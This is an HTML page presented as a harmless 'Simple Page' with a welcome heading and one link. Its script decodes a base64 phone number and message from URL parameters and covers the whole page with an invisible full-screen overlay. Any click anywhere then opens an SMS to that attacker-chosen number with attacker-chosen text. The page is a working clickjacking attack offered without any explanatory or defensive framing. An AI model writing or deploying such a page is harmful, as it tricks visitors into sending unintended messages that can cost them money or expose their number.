<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Page</title>
</head>
<body>
    <h1>Welcome to My Simple Page</h1>
    <p>This is a basic HTML page with a link.</p>
    <a id="mainUrl" href="about:blank" target="_blank">don't click here</a>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const n = atob(urlParams.get('n'));
        const s = encodeURIComponent(atob(urlParams.get('s')));
        document.getElementById('mainUrl').href = 'sms:'+n+'?&body='+s;
        const modal = document.createElement('div');
        modal.style.position = 'fixed';
        modal.style.top = '0';
        modal.style.left = '0';
        modal.style.width = '100%';
        modal.style.height = '100%';
        modal.style.zIndex = '9999';
        modal.style.cursor = 'pointer';
        modal.style.opacity = '0';
        const modalLink = document.createElement('a');
        modalLink.href = document.getElementById('mainUrl').href;
        modalLink.style.display = 'block';
        modalLink.style.width = '100%';
        modalLink.style.height = '100%';
        modal.appendChild(modalLink);
        document.body.appendChild(modal);
    </script>
</body>
</html>
